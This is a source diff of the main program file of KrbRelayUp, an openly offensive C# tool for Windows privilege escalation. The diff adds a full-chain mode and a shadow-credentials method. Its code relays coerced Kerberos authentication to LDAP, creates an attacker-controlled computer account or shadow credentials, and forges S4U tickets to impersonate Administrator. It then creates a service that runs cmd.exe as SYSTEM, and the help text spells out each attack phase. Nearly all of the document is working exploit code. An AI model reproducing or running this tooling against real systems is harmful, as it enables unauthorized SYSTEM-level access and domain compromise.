@@ -1,70 +1,206 @@
 using System;
 using System.DirectoryServices.Protocols;
+using System.Reflection;
 using System.Security.Principal;
 using System.Text;
 using System.Text.RegularExpressions;
 
 namespace KrbRelayUp
 {
-    class Program
+    public static class Options
     {
+
+        public enum PhaseType
+        {
+            System = 0,
+            Relay = 1,
+            Spawn = 2,
+            KrbSCM = 3,
+            Full = 4
+        }
+
+        public static PhaseType phase = PhaseType.System;
+
+        // General Options
         public static string domain = null;
         public static string domainDN = "";
         public static string domainController = null;
-        public static string computerName = "KRBRELAYUP";
-        public static string computerPassword = null;
-        public static string computerPasswordHash = null;
-        public static string computerSid = null;
-        public static string newComputerDN = null;
-        public static string port = "12345";
+        public static bool useSSL = false;
+        public static int ldapPort = 389;
+        public static bool useCreateNetOnly = false;
+        //public static bool verbose = false;
+
+        // Relay Options
+        public static Relay.Ldap.RelayAttackType relayAttackType = Relay.Ldap.RelayAttackType.RBCD;
+        public static string relaySPN = null;
+        public static string comServerPort = "12345";
+        public static bool attackDone = false;
+
+        // RBCD Method
+        public static bool rbcdCreateNewComputerAccount = false;
+        public static string rbcdComputerName = "KRBRELAYUP";
+        public static string rbcdComputerPassword = null;
+        public static string rbcdComputerPasswordHash = null;
+        public static string rbcdComputerSid = null;
+        
+        // SHADOWCRED Method
+        public static bool shadowCredForce = false;
+        public static string shadowCredCertificate = null;
+        public static string shadowCredCertificatePassword = null;
+
+        // Spawn Options
         public static string impersonateUser = "Administrator";
+        public static string targetSPN = $"HOST/{Environment.MachineName.ToUpper()}";
+        public static string targetDN = "";
+
+        // KRBSCM Options
         public static string serviceName = "KrbSCM";
         public static string serviceCommand = null;
-        public static string targetSPN = $"HOST/{Environment.MachineName.ToUpper()}";
+        public static void PrintOptions()
+        {
+            var allPublicFields = typeof(Options).GetFields();
+            foreach (var opt in allPublicFields)
+            {
+                Console.WriteLine($"{opt.Name}:{opt.GetValue(null)}");
+            }
+        }
 
+    }
+
+    class Program
+    {
+        
         public static void GetHelp()
         {
-            Console.WriteLine("RELAY:");
-            Console.WriteLine("Usage: KrbRelayUp.exe relay -d FQDN -cn COMPUTERNAME [-c] [-cp PASSWORD]\n");
-            Console.WriteLine("    -d  (--Domain)                   FQDN of domain.");
-            Console.WriteLine("    -dc (--DomainController)         FQDN/IP of domain controller. (Optional)");
-            Console.WriteLine("    -c  (--CreateNewComputerAccount) Create new computer account for RBCD. Will use the current authenticated user.");
-            Console.WriteLine("    -cn (--ComputerName)             Name of attacker owned computer account for RBCD. (default=KRBRELAYUP$ [if -c is enabled])");
-            Console.WriteLine("    -cp (--ComputerPassword)         Password of computer account for RBCD. (default=RANDOM [if -c is enabled])");
-            Console.WriteLine("    -p  (--Port)                     Port for Com Server (default=12345)");
-
+            Console.WriteLine("FULL: Perform full attack chain. Options are identical to RELAY. Tool must be on disk.");
+            Console.WriteLine("RELAY: First phase of the attack. Will Coerce Kerberos auth from local machine account, relay it to LDAP and create a control primitive over the local machine using RBCD or SHADOWCRED.");
+            Console.WriteLine("Usage: KrbRelayUp.exe relay -d FQDN -cn COMPUTERNAME [-c] [-cp PASSWORD | -ch NTHASH]\n");
+            Console.WriteLine("    -m   (--Method)                   Abuse method to use in after a successful relay to LDAP <rbcd/shadowcred> (default=rbcd)");
+            Console.WriteLine("    -p   (--Port)                     Port for Com Server (default=12345)");
             Console.WriteLine("");
-            Console.WriteLine("SPAWN:");
-            Console.WriteLine("Usage: KrbRelayUp.exe spawn -d FQDN -cn COMPUTERNAME [-cp PASSWORD | -ch NTHASH] [-i USERTOIMPERSONATE]\n");
-            Console.WriteLine("    -d  (--Domain)                   FQDN of domain.");
-            Console.WriteLine("    -dc (--DomainController)         FQDN/IP of domain controller. (Optional)");
-            Console.WriteLine("    -cn (--ComputerName)             Name of attacker owned computer account for RBCD. (default=KRBRELAYUP$)");
-            Console.WriteLine("    -cp (--ComputerPassword)         Password of computer account for RBCD.");
-            Console.WriteLine("    -ch (--ComputerPasswordHash)     Password NT hash of computer account for RBCD. (Optional)");
-            Console.WriteLine("    -i  (--Impersonate)              User to impersonate. should be a local administrator in the target computer. (default=Administrator)");
-            Console.WriteLine("    -s  (--ServiceName)              Name of the service to be created. (default=KrbSCM)");
-            Console.WriteLine("    -sc (--ServiceCommand)           Service command [binPath]. (default = spawn cmd.exe as SYSTEM)");
-
+            Console.WriteLine("    # RBCD Method:");
+            Console.WriteLine("    -c   (--CreateNewComputerAccount) Create new computer account for RBCD. Will use the current authenticated user.");
+            Console.WriteLine("    -cn  (--ComputerName)             Name of attacker owned computer account for RBCD. (default=KRBRELAYUP$)");
+            Console.WriteLine("    -cp  (--ComputerPassword)         Password of computer account for RBCD. (default=RANDOM [if -c is enabled])");
             Console.WriteLine("");
-            Console.WriteLine("KRBSCM:");
-            Console.WriteLine("Usage: KrbRelayUp.exe krbscm [-s SERVICENAME] [-sc SERVICECOMMANDLINE]\n");
+            Console.WriteLine("    # SHADOWCRED Method:");
+            Console.WriteLine("    -f   (--ForceShadowCred)          Clear the msDS-KeyCredentialLink attribute of the attacked computer account before adding our new shadow credentials. (Optional)");
+
+            Console.WriteLine("\n");
+            Console.WriteLine("SPAWN: Second phase of the attack. Will use the appropriate control primitive to obtain a Kerberos Service Ticket and will use it to create a new service running as SYSTEM.");
+            Console.WriteLine("Usage: KrbRelayUp.exe spawn -d FQDN -cn COMPUTERNAME [-cp PASSWORD | -ch NTHASH] <-i USERTOIMPERSONATE>\n");
+            Console.WriteLine("    -m   (--Method)                   Abuse method used in RELAY phase <rbcd/shadowcred> (default=rbcd)");
+            Console.WriteLine("    -i   (--Impersonate)              User to impersonate. should be a local administrator in the target computer. (default=Administrator)");
+            Console.WriteLine("    -s   (--ServiceName)              Name of the service to be created. (default=KrbSCM)");
+            Console.WriteLine("    -sc  (--ServiceCommand)           Service command [binPath]. (default = spawn cmd.exe as SYSTEM)");
+            Console.WriteLine("");
+            Console.WriteLine("    # RBCD Method:");
+            Console.WriteLine("    -cn  (--ComputerName)             Name of attacker owned computer account for RBCD. (default=KRBRELAYUP$)");
+            Console.WriteLine("    -cp  (--ComputerPassword)         Password of computer account for RBCD. (either -cp or -ch must be specified)");
+            Console.WriteLine("    -ch  (--ComputerPasswordHash)     Password NT hash of computer account for RBCD. (either -cp or -ch must be specified)");
+            Console.WriteLine("");
+            Console.WriteLine("    # SHADOWCRED Method:");
+            Console.WriteLine("    -ce  (--Certificate)              Base64 encoded certificate or path to certificate file");
+            Console.WriteLine("    -cep (--CertificatePassword)      Certificate password (if applicable)");
+
+            Console.WriteLine("\n");
+            Console.WriteLine("General Options:");
+            Console.WriteLine("    -d  (--Domain)                   FQDN of domain. (Optional)");
+            Console.WriteLine("    -dc (--DomainController)         FQDN of domain controller. (Optional)");
+            Console.WriteLine("    -ssl                             Use LDAP over SSL. (Optional)");
+            Console.WriteLine("    -n                               Use CreateNetOnly (needs to be on disk) instead of PTT when importing ST (enabled if using FULL mode)");
+            //Console.WriteLine("    -v  (--Verbose)                  Show verbose output. (Optional)");
+
+            Console.WriteLine("\n");
+            Console.WriteLine("KRBSCM: Will use the currently loaded Kerberos Service Ticket to create a new service running as SYSTEM.");
+            Console.WriteLine("Usage: KrbRelayUp.exe krbscm <-s SERVICENAME> <-sc SERVICECOMMANDLINE>\n");
             Console.WriteLine("    -s  (--ServiceName)              Name of the service to be created. (default=KrbSCM)");
             Console.WriteLine("    -sc (--ServiceCommand)           Service command [binPath]. (default = spawn cmd.exe as SYSTEM)");
 
             Console.WriteLine("");
         }
 
-        static void Main(string[] args)
+        static void ParseArgs(string[] args)
         {
-            Console.WriteLine("KrbRelayUp - Relaying you to SYSTEM\n");
 
             if (args.Length == 0)
             {
                 GetHelp();
-                return;
+                Environment.Exit(0);
             }
 
-            if (args[0].ToLower() == "system")
+            if (!Enum.TryParse<Options.PhaseType>(args[0], true, out Options.phase))
+            {
+                GetHelp();
+                Console.WriteLine($"\n[-] Unrecognized Phase Type \"{args[0]}\"");
+                Environment.Exit(0);
+            }
+
+            // General Options
+            int iDomain = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(d|Domain)$").Match(s).Success);
+            int iDomainController = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(dc|DomainController)$").Match(s).Success);
+            int iSSL = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(ssl)$").Match(s).Success);
+            int iCreateNetOnly = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(n|CreateNetOnly)$").Match(s).Success);
+            //int iVerbose = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(v|Verbose)$").Match(s).Success);
+            Options.domain = (iDomain != -1) ? args[iDomain + 1] : Options.domain;
+            Options.domainController = (iDomainController != -1) ? args[iDomainController + 1] : Options.domainController;
+            Options.useSSL = (iSSL != -1) ? true : Options.useSSL;
+            if (Options.useSSL)
+                Options.ldapPort = 636;
+            Options.useCreateNetOnly = (iCreateNetOnly != -1) ? true : Options.useCreateNetOnly;
+            //Options.verbose = (iVerbose != -1) ? true : Options.verbose;
+
+            // Relay Options
+            int iMethod = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(m|Method)$").Match(s).Success);
+            int iComServerPort = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(p|Port)$").Match(s).Success);
+            if (iMethod != -1)
+            {
+                if (!Enum.TryParse<Relay.Ldap.RelayAttackType>(args[iMethod + 1], true, out Options.relayAttackType))
+                {
+                    GetHelp();
+                    Console.WriteLine($"\n[-] Unrecognized RELAY attack type \"{args[iMethod + 1]}\"");
+                    Environment.Exit(0);
+                }
+            }
+            Options.comServerPort = (iComServerPort != -1) ? args[iComServerPort + 1] : Options.comServerPort;
+
+            // RBCD Method
+            int iCreateNewComputerAccount = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(c|CreateNewComputerAccount)$").Match(s).Success);
+            int iComputerName = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(cn|ComputerName)$").Match(s).Success);
+            int iComputerPassword = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(cp|ComputerPassword)$").Match(s).Success);
+            int iComputerPasswordHash = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(ch|ComputerPasswordHash)$").Match(s).Success);
+            Options.rbcdCreateNewComputerAccount = (iCreateNewComputerAccount != -1) ? true : Options.rbcdCreateNewComputerAccount;
+            Options.rbcdComputerName = (iComputerName != -1) ? args[iComputerName + 1].TrimEnd('$') : Options.rbcdComputerName;
+            Options.rbcdComputerPassword = (iComputerPassword != -1) ? args[iComputerPassword + 1] : Options.rbcdComputerPassword;
+            Options.rbcdComputerPasswordHash = (iComputerPasswordHash != -1) ? args[iComputerPasswordHash + 1] : Options.rbcdComputerPasswordHash;
+
+            // SHADOWCRED Method
+            int iShadowCredForce = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(f|ForceShadowCred)$").Match(s).Success);
+            int iShadowCredCertificate = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(ce|Certificate)$").Match(s).Success);
+            int iShadowCredCertificatePassword = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(cep|CertificatePassword)$").Match(s).Success);
+            Options.shadowCredForce = (iShadowCredForce != -1) ? true : Options.shadowCredForce;
+            Options.shadowCredCertificate = (iShadowCredCertificate != -1) ? args[iShadowCredCertificate + 1] : Options.shadowCredCertificate;
+            Options.shadowCredCertificatePassword = (iShadowCredCertificatePassword != -1) ? args[iShadowCredCertificatePassword + 1] : Options.shadowCredCertificatePassword;
+
+            // Spawn Options
+            int iImpersonateUser = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(i|Impersonate)$").Match(s).Success);
+            Options.impersonateUser = (iImpersonateUser != -1) ? args[iImpersonateUser + 1] : Options.impersonateUser;
+
+            // KRBSCM Options
+            int iServiceName = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(s|ServiceName)$").Match(s).Success);
+            int iServiceCommand = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(sc|ServiceCommand)$").Match(s).Success);
+            Options.serviceName = (iServiceName != -1) ? args[iServiceName + 1] : Options.serviceName;
+            Options.serviceCommand = (iServiceName != -1) ? args[iServiceName + 1] : Options.serviceCommand;
+
+        }
+
+        static void Main(string[] args)
+        {
+            Console.WriteLine("KrbRelayUp - Relaying you to SYSTEM\n");
+
+            ParseArgs(args);
+
+            if (Options.phase == Options.PhaseType.System)
             {
                 try
                 {
@@ -72,160 +208,136 @@ namespace KrbRelayUp
                 }
                 catch { }
                 return;
-            }
-
-            // parse args
-            int iDomain = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(d|Domain)$").Match(s).Success);
-            int iDomainController = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(dc|DomainController)$").Match(s).Success);
-            int iCreateNewComputerAccount = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(c|CreateNewComputerAccount)$").Match(s).Success);
-            int iComputerName = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(cn|ComputerName)$").Match(s).Success);
-            int iComputerPassword = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(cp|ComputerPassword)$").Match(s).Success);
-            int iComputerPasswordHash = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(ch|ComputerPasswordHash)$").Match(s).Success);
-            int iPort = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(p|Port)$").Match(s).Success);
-            int iImpersonate = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(i|Impersonate)$").Match(s).Success);
-            int iServiceName = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(s|ServiceName)$").Match(s).Success);
-            int iServiceCommand = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(sc|ServiceCommand)$").Match(s).Success);
-
-            if (iServiceName != -1)
-                serviceName = args[iServiceName + 1];
-
-            if (iServiceCommand != -1)
-                serviceCommand = args[iServiceCommand + 1];
-
-            if (args[0].ToLower() == "krbscm")
+            } 
+            else if (Options.phase == Options.PhaseType.KrbSCM)
             {
-                KrbSCM.Run(targetSPN, serviceName, serviceCommand);
-                Environment.Exit(0);
-            }
-
-            if (iDomain == -1)
-            {
-                Console.WriteLine("Must supply FQDN using [-d FQDN]");
-                GetHelp();
+                KrbSCM.Run();
                 return;
             }
 
-            domain = args[iDomain + 1];
-
-            if (iDomainController != -1)
-                domainController = Networking.GetDCNameFromIP(args[iDomainController + 1]);
-
-            if (String.IsNullOrEmpty(domainController))
+            // If domain or dc is null try to find the them automatically
+            if (String.IsNullOrEmpty(Options.domain) || String.IsNullOrEmpty(Options.domainController))
             {
-                domainController = Networking.GetDCName(domain);
-                if (String.IsNullOrEmpty(domainController))
+                if (!Networking.GetDomainInfo())
+                    return;
+            }
+
+            // Check if domain controller is an IP and if so try to resolve it to the DC FQDN
+            if (!String.IsNullOrEmpty(Options.domainController))
+            {
+                Options.domainController = Networking.GetDCNameFromIP(Options.domainController);
+                if (String.IsNullOrEmpty(Options.domainController))
                 {
-                    Console.WriteLine("[-] Could not find Domain Controller FQDN. Try specifying it with --DomainController flag.");
+                    Console.WriteLine("[-] Could not find Domain Controller FQDN From IP. Try specifying the FQDN with --DomainController flag.");
                     return;
                 }
             }
 
-            if (args[0].ToLower() == "relay")
-            {
-                // Initialize the COM server for Kerberos relay
-                Relay.Relay.InitializeCOMServer($"ldap/{domainController}");
-            }
 
-
-            foreach (string dc in domain.Split('.'))
-            {
-                domainDN += string.Concat(",DC=", dc);
-            }
-            domainDN = domainDN.TrimStart(',');
-
-            if (iComputerName != -1)
-            {
-                computerName = args[iComputerName + 1];
-                computerName = computerName.TrimEnd('$');
-            }
-
-            if (iComputerPassword != -1)
-                computerPassword = args[iComputerPassword + 1];
-
-            if (iComputerPasswordHash != -1)
-                computerPasswordHash = args[iComputerPasswordHash + 1];
-
-            // Bind to LDAP using current authenticated user
-            LdapDirectoryIdentifier identifier = new LdapDirectoryIdentifier(domainController, 389);
-            LdapConnection ldapConnection = new LdapConnection(identifier);
-            ldapConnection.SessionOptions.Sealing = true;
-            ldapConnection.SessionOptions.Signing = true;
-            ldapConnection.Bind();
-
-            if (args[0].ToLower() == "relay")
+            if (Options.phase == Options.PhaseType.Relay || Options.phase == Options.PhaseType.Full)
             {
                 Console.WriteLine();
+                
+                // Set required variables for relay
+                Options.relaySPN = $"ldap/{Options.domainController}";
+                Options.domainDN = Networking.GetDomainDN(Options.domain);
+                
+                // Initialize COM Server for relaying Kerberos auth from NT/SYSTEM to LDAP
+                Relay.Relay.InitializeCOMServer();
 
-                // if CreateComputerAccount is enabled
-                if (iCreateNewComputerAccount != -1)
+                // Bind to LDAP using current authenticated user
+                LdapDirectoryIdentifier identifier = new LdapDirectoryIdentifier(Options.domainController, Options.ldapPort);
+                LdapConnection ldapConnection = new LdapConnection(identifier);
+                ldapConnection.SessionOptions.Sealing = true;
+                ldapConnection.SessionOptions.Signing = true;
+                ldapConnection.Bind();
+
+                if (Options.relayAttackType == Relay.Ldap.RelayAttackType.RBCD)
                 {
-                    newComputerDN = $"CN={computerName},CN=Computers,{domainDN}";
-
-                    if (String.IsNullOrEmpty(computerPassword))
-                        computerPassword = RandomPasswordGenerator(16);
-
-                    AddRequest request = new AddRequest();
-                    request.DistinguishedName = newComputerDN;
-                    request.Attributes.Add(new DirectoryAttribute("objectClass", "Computer"));
-                    request.Attributes.Add(new DirectoryAttribute("SamAccountName", $"{computerName}$"));
-                    request.Attributes.Add(new DirectoryAttribute("userAccountControl", "4096"));
-                    request.Attributes.Add(new DirectoryAttribute("DnsHostName", $"{computerName}.{domain}"));
-                    request.Attributes.Add(new DirectoryAttribute("ServicePrincipalName", $"HOST/{computerName}.{domain}", $"RestrictedKrbHost/{computerName}.{domain}", $"HOST/{computerName}", $"RestrictedKrbHost/{computerName}"));
-                    request.Attributes.Add(new DirectoryAttribute("unicodePwd", Encoding.Unicode.GetBytes($"\"{computerPassword}\"")));
-
-                    try
+                    // Create new computer account if flag is enabled
+                    if (Options.rbcdCreateNewComputerAccount)
                     {
-                        DirectoryResponse res = ldapConnection.SendRequest(request);
-                        Console.WriteLine($"[+] Computer account \"{computerName}$\" added with password \"{computerPassword}\"");
+                        // Generate random passowrd for the new computer account if not specified
+                        if (String.IsNullOrEmpty(Options.rbcdComputerPassword))
+                            Options.rbcdComputerPassword = RandomPasswordGenerator(16);
+
+                        AddRequest request = new AddRequest();
+                        request.DistinguishedName = $"CN={Options.rbcdComputerName},CN=Computers,{Options.domainDN}";
+                        request.Attributes.Add(new DirectoryAttribute("objectClass", "Computer"));
+                        request.Attributes.Add(new DirectoryAttribute("SamAccountName", $"{Options.rbcdComputerName}$"));
+                        request.Attributes.Add(new DirectoryAttribute("userAccountControl", "4096"));
+                        request.Attributes.Add(new DirectoryAttribute("DnsHostName", $"{Options.rbcdComputerName}.{Options.domain}"));
+                        request.Attributes.Add(new DirectoryAttribute("ServicePrincipalName", $"HOST/{Options.rbcdComputerName}.{Options.domain}", $"RestrictedKrbHost/{Options.rbcdComputerName}.{Options.domain}", $"HOST/{Options.rbcdComputerName}", $"RestrictedKrbHost/{Options.rbcdComputerName}"));
+                        request.Attributes.Add(new DirectoryAttribute("unicodePwd", Encoding.Unicode.GetBytes($"\"{Options.rbcdComputerPassword}\"")));
+
+                        try
+                        {
+                            DirectoryResponse res = ldapConnection.SendRequest(request);
+                            Console.WriteLine($"[+] Computer account \"{Options.rbcdComputerName}$\" added with password \"{Options.rbcdComputerPassword}\"");
+                        }
+                        catch (Exception e)
+                        {
+                            Console.WriteLine($"[-] Could not add new computer account:");
+                            Console.WriteLine($"[-] {e.Message}");
+                            return;
+                        }
                     }
-                    catch (Exception e)
-                    {
-                        Console.WriteLine($"[-] Could not add new computer account:");
-                        Console.WriteLine($"[-] {e.Message}");
-                        return;
-                    }
+
+                    // Get Computer SID for RBCD
+                    Options.rbcdComputerSid = GetObjectSidForComputerName(ldapConnection, Options.rbcdComputerName, Options.domainDN);
+
                 }
 
-                // Get Computer SID for RBCD
-                string sid = GetObjectSidForComputerName(ldapConnection, computerName, (newComputerDN != null) ? newComputerDN : domainDN);
-
-                if (iPort != -1)
-                    port = args[iPort + 1];
-
-                Relay.Relay.Run(domain, domainController, sid, port);
+                Relay.Relay.Run();
+                
             }
 
-            if (args[0].ToLower() == "spawn")
+
+            if (Options.phase == Options.PhaseType.Spawn || (Options.phase == Options.PhaseType.Full && Options.attackDone))
             {
-                Interop.KERB_ETYPE eType = new Interop.KERB_ETYPE();
-                string hash = null;
-
-                if (!String.IsNullOrEmpty(computerPassword))
+                byte[] bFinalTicket = null;
+                if (Options.relayAttackType == Relay.Ldap.RelayAttackType.RBCD)
                 {
-                    string salt = $"{domain.ToUpper()}host{computerName.ToLower()}.{domain.ToLower()}";
-                    hash = Crypto.KerberosPasswordHash(Interop.KERB_ETYPE.aes256_cts_hmac_sha1, computerPassword, salt);
-                    eType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
+                    Interop.KERB_ETYPE eType = new Interop.KERB_ETYPE();
+                    string hash = null;
+
+                    if (!String.IsNullOrEmpty(Options.rbcdComputerPassword))
+                    {
+                        string salt = $"{Options.domain.ToUpper()}host{Options.rbcdComputerName.ToLower()}.{Options.domain.ToLower()}";
+                        hash = Crypto.KerberosPasswordHash(Interop.KERB_ETYPE.aes256_cts_hmac_sha1, Options.rbcdComputerPassword, salt);
+                        eType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
+                    }
+                    else if (!String.IsNullOrEmpty(Options.rbcdComputerPasswordHash))
+                    {
+                        hash = Options.rbcdComputerPasswordHash;
+                        eType = Interop.KERB_ETYPE.rc4_hmac;
+                    }
+
+                    byte[] bInnerTGT = AskTGT.TGT($"{Options.rbcdComputerName}$", Options.domain, hash, eType, outfile: null, ptt: false);
+                    KRB_CRED TGT = new KRB_CRED(bInnerTGT);
+
+                    KRB_CRED elevateTicket = S4U.S4U2Self(TGT, Options.impersonateUser, Options.targetSPN, outfile: null, ptt: false);
+                    bFinalTicket = S4U.S4U2Proxy(TGT, Options.impersonateUser, Options.targetSPN, outfile: null, ptt: (Options.phase != Options.PhaseType.Full), tgs: elevateTicket);
                 }
-                else if (!String.IsNullOrEmpty(computerPasswordHash))
+                else if (Options.relayAttackType == Relay.Ldap.RelayAttackType.ShadowCred)
                 {
-                    hash = computerPasswordHash;
-                    eType = Interop.KERB_ETYPE.rc4_hmac;
+                    byte[] bInnerTGT = AskTGT.TGT($"{Environment.MachineName}$", Options.domain, Options.shadowCredCertificate, Options.shadowCredCertificatePassword, Interop.KERB_ETYPE.aes256_cts_hmac_sha1, outfile: null, ptt: false);
+                    KRB_CRED TGT = new KRB_CRED(bInnerTGT);
+                    KRB_CRED elevateTicket = S4U.S4U2Self(TGT, Options.impersonateUser, Options.targetSPN, outfile: null, ptt: false);
+                    bFinalTicket = LSA.SubstituteTGSSname(elevateTicket, Options.targetSPN, ptt: (Options.phase != Options.PhaseType.Full));
                 }
-
-                byte[] bInnerTGT = AskTGT.TGT($"{computerName}$", domain, hash, eType, outfile: null, ptt: true);
-                KRB_CRED TGT = new KRB_CRED(bInnerTGT);
-
-                if (iImpersonate != -1)
-                {
-                    impersonateUser = args[iImpersonate + 1];
-                }
-
-                KRB_CRED elevateTicket = S4U.S4U2Self(TGT, impersonateUser, targetSPN, outfile: null, ptt: true);
-                S4U.S4U2Proxy(TGT, impersonateUser, targetSPN, outfile: null, ptt: true, tgs: elevateTicket);
 
                 System.Threading.Thread.Sleep(1500);
 
-                KrbSCM.Run(targetSPN, serviceName, serviceCommand);
+                if (Options.phase == Options.PhaseType.Full || Options.useCreateNetOnly)
+                {
+                    Helpers.CreateProcessNetOnly($"{System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName} krbscm", show: false, kirbiBytes: bFinalTicket);
+                }
+                else
+                {
+                    KrbSCM.Run();
+                }
+
             }
         }
 
@@ -247,7 +359,7 @@ namespace KrbRelayUp
             return null;
         }
 
-        static string RandomPasswordGenerator(int length)
+        public static string RandomPasswordGenerator(int length)
         {
             string alphaCaps = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
             string alphaLow = "abcdefghijklmnopqrstuvwxyz";
